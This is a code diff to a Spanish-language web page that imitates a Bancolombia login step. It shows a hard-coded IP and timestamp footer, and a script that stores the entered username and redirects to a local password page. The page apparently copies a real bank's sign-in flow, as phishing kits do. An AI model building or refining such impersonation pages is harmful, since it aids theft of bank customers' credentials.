@@ -193,7 +193,7 @@
         
         <div class="footer-info">
             <div>Dirección IP: 181.235.90.89</div>
-            <div>Sábado 27 de Septiembre de 2025 12:04:48 PM</div>
+            <div id="datetime">Sábado 27 de Septiembre de 2025 12:04:48 PM</div>
             <div>Copyright © 2025 Bancolombia.</div>
         </div>
     </div>
@@ -227,15 +227,12 @@
         });
         
         function goBack() {
-            // Volver a la página anterior
             window.history.back();
         }
         
         function continueToNext() {
             if (usernameInput.value.length >= 8) {
-                // Guardar usuario y continuar al siguiente paso
                 sessionStorage.setItem('username', usernameInput.value);
-                // Redirigir a la página de clave principal
                 window.location.href = 'password.html';
             }
         }
@@ -254,10 +251,9 @@
                 hour12: true
             };
             const dateTimeString = now.toLocaleDateString('es-CO', options);
-            document.querySelector('.footer-info div:nth-child(2)').textContent = dateTimeString;
+            document.getElementById('datetime').textContent = dateTimeString;
         }
         
-        // Actualizar cada segundo
         setInterval(updateDateTime, 1000);
         updateDateTime();
     </script>
